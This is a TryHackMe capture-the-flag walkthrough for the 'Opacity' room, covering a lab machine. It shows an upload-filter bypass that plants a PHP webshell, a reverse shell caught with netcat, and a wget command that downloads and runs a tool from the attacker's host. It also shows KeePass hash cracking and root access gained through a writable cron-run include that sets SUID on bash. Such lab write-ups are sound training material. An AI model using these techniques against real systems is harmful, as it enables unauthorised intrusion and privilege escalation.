---
title: "Opacity - TryHackMe"
description: "A web-based tryhackme challenge exploring file upload vulnerabilities and privilege escalation."
---

![Screenshot from 2025-06-24 22-24-11](https://github.com/user-attachments/assets/0690f9d5-c065-4395-8be1-81bf24bbf4c5)

In this writeup we are going to solve the Opacity room of Tryhackme. It is a fun boot2root challenge means we have to first get the user level access and then escalate the privileges to root. 

`Date: 24 June 2025`

### Table of Content

1. [Reconnaissance](#reconnaissance)
2. [Shell as www-data - RCE](#shell-as-www-data---rce)
3. [Shell as sysadmin](#shell-as-sysadmin)
4. [Privilege escalation to root](#privilege-escalation-to-root)
5. [Closing Words](#closing-words)
   
### Reconnaissance

In this phase we will gather the information about the target both passively and actively.

**Nmap**

First we should scan for the open ports on the servers using nmap :

```
nmap -Pn 10.10.156.172 -p- --min-rate 5000 -oN nmap-all-ports.txt
```

![Screenshot from 2025-06-23 11-26-48](https://github.com/user-attachments/assets/c9856c95-ee66-4cc5-ba92-76dfc1864f2c)


Now we can run the default nmap scripts on the open ports and also grab information about the versions of the running services.

```
nmap -Pn 10.10.94.39  -p 22,80,139,445 --min-rate 5000 -sC -sV -oN nmap-service-scripts.txt 
```

![Screenshot from 2025-06-23 11-28-09](https://github.com/user-attachments/assets/3b4413e4-7468-4dfb-9390-82d7a4db8cfd)


**Port 80 - Apache httpd 2.4.41**

When accessing the url `http://10.10.94.39` it is redirecting us to `/login.php` endpoint :

![Screenshot from 2025-06-23 11-30-45](https://github.com/user-attachments/assets/8b22c50a-6285-481c-a3b0-1d9070c4bebe)


From here we can get the following piece of information :

- Operating system is GNU/Linux - Ubuntu 
- Programming language used here is `php`
- Server is `apache` having version `2.4.41`

Things can be done

- Login with Default creds
- SQL Injection
- Response Manipulation 

But before trying anything on the login page we will move forward to gather more information and increase our attack surface

**Directory Bruteforcing** 

Checking for the directories present on the server and can be accessed by us.

```
gobuster dir -u http://10.10.94.39/ -w /snap/seclists/current/Discovery/Web-Content/directory-list-2.3-medium.txt -t 120 -o directory.txt
```

`Output -`

```
/css                  (Status: 301) [Size: 308] [--> http://10.10.94.39/css/]
/cloud                (Status: 301) [Size: 310] [--> http://10.10.94.39/cloud/]
/server-status        (Status: 403) [Size: 276]
```


### Shell as www-data - RCE

From the discovered the encdpoints `/cloud` looks interesting so we can continue with it.

`Webpage -`

![Screenshot from 2025-06-23 12-47-20](https://github.com/user-attachments/assets/ccf0dfa4-729c-42f8-8017-9c3097cb9b02)


Here we have a functionality to upload files (Specifically Images) on the server using the external links also increasing our attack surface.

Let's try to upload a random simple image using the URL :

```
https://picsum.photos/200/300
```

when trying to submit this URL an error is presented saying `Please select an image`

![Screenshot from 2025-06-23 12-59-47](https://github.com/user-attachments/assets/7fea7ce4-732b-4fe9-ae64-465d151c39bf)


After this I tried uploading with many different URLs but nothing worked so what I did is starting my own http server using python with :

```
python3 -m http.server
```

and tried to upload a random image using the server :

```
http://10.21.207.183:8000/download.jpeg
```

and as expected the uploading begin :

![Screenshot from 2025-06-23 13-03-20](https://github.com/user-attachments/assets/680236b3-6188-43d5-8079-3bd14a04cb42)

![Screenshot from 2025-06-23 13-09-11](https://github.com/user-attachments/assets/fe7e55d7-388e-46bb-9c8d-f73d71066c47)


As we can see image successfully uploaded on the server and can be accessed using the provided URL.

When i tried uploading a `.php` file it is again returning the same error `Please select an image` so we need to find a way to bypass the extension check implemented on the back end. 

After spending some hour on the bypass I figured out to bypass the filter using `#`.

yah a simple `#` is enough here what it does is when the application encounters an `#` in the URL it strips out everything that is appended to it.

`webshell.php` :

```
<?php system($_GET['cmd']); ?>

```

Uploading with this URL :

```
http://10.21.207.183:8000/webshell.php.#.jpeg
```


![Screenshot from 2025-06-23 22-04-58](https://github.com/user-attachments/assets/de415978-defa-40ba-b5b9-246fb310a3ae)



We got `RCE` boommmmm....

For the reverse shell i am going to use this script [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Before uploading it on the server make sure to change this two fields :

```
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Start netcat listener on you machine :

```
 nc -nvlp 4000
```


```
Connection received on 10.10.131.94 47568
Linux ip-10-10-131-94 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 17:08:56 up 45 min,  0 users,  load average: 0.00, 0.00, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

now we have the `shell` as user `www-data`

### Shell as sysadmin

First we will perform basic enumeration to find some interesting files or binaries.

1. In the `/opt` directory there is `datasets.kdbx`
2. In the `/var/backups/` there is `backup.zip`
3. application files/directories in `/var/www/html`

`/var/www/html/cloud/index.php` contains the code that handles the file upload feature :

```
<!DOCTYPE html>
<html>
<head>
<link rel="stylesheet" href="style.css">
<title>Opacity Storage</title>
</head>
<body>
<h1><strong>5 Minutes File Upload</strong> - Personal Cloud Storage</h1>
<?php
session_start();
    $BASE_URL = strtok($_SERVER['REQUEST_URI'],'?');
    if (isset($_POST['url'])){
        $url = $_POST['url'];
    
        
    if (preg_match('/\.(jpeg|jpg|png|gif)$/i', $url)) {
	
        exec("wget -P /var/www/html/cloud/images {$url}");
	echo '<div class="form-group">Transferring file..<br></div>';
	echo '<div class="form-group"><img src="load.gif" alt="loading" width="500" ></div>';
	$name = basename($url);
	$link = "/cloud/images/$name";
        $_SESSION['link'] = $link;
	
        header( "refresh:3;url=storage.php" );
	
	} else {        
		echo '<div class="form-group">Please select an image</div>';
    }
}


    
?>
	<div class="form-group">
<p style="text-align:center;"><img src="folder.png" alt="Folder" width="40%" height="40%"></p>
    <label for="title"><span>External Url:</span></label>
    <form name='upload' method='post' action="<?php echo $BASE_URL; ?>">
        <input type='text' id='url' name='url'  class="form-controll"/><br>
</div>
	<div class="form-group">
    <button type="submit">Upload image
</form>
    
  </div>

  </button>
</form>
</div>
</body>
</html>

```

From above code we can see this `preg_match('/\.(jpeg|jpg|png|gif)$/i', $url)` is performing the file extension check. Also the file is downloaded suing wget command which strips the part after `#` symbol.

![Screenshot from 2025-06-24 13-56-13](https://github.com/user-attachments/assets/27d30c93-04b6-4fd0-9e9b-3953f100ecab)


4. In `/var/www/html/login.php` credentials are leaked :

`$logins = array('admin' => 'oncloud9','root' => 'oncloud9','administrator' => 'oncloud9');`

Transfer both `datasets.kd` and `backup.zip` using python server.

Let's try to login with the credentials :

![Screenshot from 2025-06-24 14-02-35](https://github.com/user-attachments/assets/db784858-de59-468c-a703-762cb9639678)


We have successfully logged in to the application but there 's nothing interesting there on the page.

Among all the discovered files `dataset.kdbx` is interesting so we can continue with it.

`Keepass` is a opensource password manager that securely stores credentials in encrypted database file which has a extension `.kdbx` 

Database file itself is protected with a master password and to crack the password we need to extract some information from the header of the file which can be done using `keepass2john`

```
john-the-ripper.keepass2john dataset.kdbx > dataset.hash
```

To crack the hash we can use `hashcat` or `johntheripper` both what does it they take one password at a time from the wordlist and perform the encryption according to the details extracted by the `keepass2john` and then try to decrypt the data using the generated key.

```
john --wordlist=./rockyou.txt dataset.hash 
```

```
74xxxxxx        (dataset)     
```

So we cracked the hash successfully now we can open the dataabase file in keepass2 which can be installed in (for debian) :

```
sudo apt install keepass2
```

![Screenshot from 2025-06-24 15-39-14](https://github.com/user-attachments/assets/b7466803-14ca-4ac1-b6a5-26373ec9c572)


Cool... We got the password of sysadmin let's try to connect to the server through `ssh` as `sysadmin`

```
ssh sysadmin@10.10.114.29 
```

![userflag](https://github.com/user-attachments/assets/097be906-2bd0-479b-9bd1-51759d5aacdb)


### Privilege escalation to root

In the `scripts` directory we have file `script.php` having content :

```
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
```

This script is used to create the backup of `/home/sysadmin/scripts` as `/var/backups/backup.zip` and removing the files stored in the directory `/var/www/html/cloud/images/`

But the question arises how this file is executing ??

Maybe there is root cron job scheduled for executing the script. we can snoop on processes without root privileges using [pspy](https://github.com/DominicBreuker/pspy?tab=readme-ov-file)

```
wget http://10.21.207.183:8000/pspy64 -O /tmp/pspy;chmod +x /tmp/pspy;/tmp/pspy
```

![Screenshot from 2025-06-24 17-23-00](https://github.com/user-attachments/assets/b79a0531-c5ca-481b-b57e-bef58a6fdaf9)


As we can see there is a cron job for `script.php` so to execute any command as root we have to two ways either we can modify the `script.php` or `backup.inc.php`

File permissions for `script.php` :

![Screenshot from 2025-06-24 17-33-36](https://github.com/user-attachments/assets/93babc1a-5bc8-4069-963f-736c2795c518)


File Permission for `backup.inc.php` :

![Screenshot from 2025-06-24 17-37-09](https://github.com/user-attachments/assets/4ece3878-727d-4591-a245-0ceadee206b0)


As we can see we don't have write permission for `script.php` but we have `rwx` permission on the `scripts/lib` directory so what we can do is we can replace the `backup.inc.php` file with our evil `backup.inc.php` :

```
<?php system("chmod +s /bin/bash") ?>
```

This will add the set the SUID (Set User ID) of the `/bin/bash` what it means is it will attach the User ID of the owner of the file to the binary so when any user execute the binary it will executed as the owner of the binary.

Wait for 1 min...

```
sysadmin@ip-10-10-112-134:~/scripts/lib$ ls -lah /bin/bash

-rwsr-sr-x 1 root root 1.2M Apr 18  2022 /bin/bash
```

SUID is successfully set now we can try to spawn the root shell :

```
/bin/bash -p
```

![root](https://github.com/user-attachments/assets/eb11e0e5-291f-4ab4-b754-211172fe85ab)


Boommmm... we are root and can read `proof.txt`

Thanks for going through this Opacity writeup!
This challenge was a great exercise in exploiting insecure file uploads, bypassing filters, and gaining initial access to a system. It also provided a hands-on look at privilege escalation in a real-world-like scenario.

### Closing Words

I hope this walkthrough helped you understand the techniques and thought process behind solving such challenges. Keep hacking, stay sharp, and don’t forget to share this with others in the community — let’s learn and grow together!
